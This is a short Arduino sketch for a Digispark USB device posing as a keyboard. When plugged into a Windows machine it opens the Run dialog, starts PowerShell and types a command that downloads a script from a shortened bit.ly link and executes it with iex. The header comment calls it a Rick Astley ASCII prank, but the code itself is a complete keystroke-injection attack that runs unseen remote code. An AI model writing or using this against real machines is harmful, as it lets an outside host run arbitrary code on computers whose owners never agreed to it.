//This DigiKeyboard Script turns Rick Astley to Risk ASCII and made him to dance and sing Never Let You Down inside your PowerShell screen./

#include "DigiKeyboardPtBr.h"

void setup(){
  //empity
}

void loop(){

  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.print("powershell");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.print("iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);

  for (;;){/*empty*/}
}
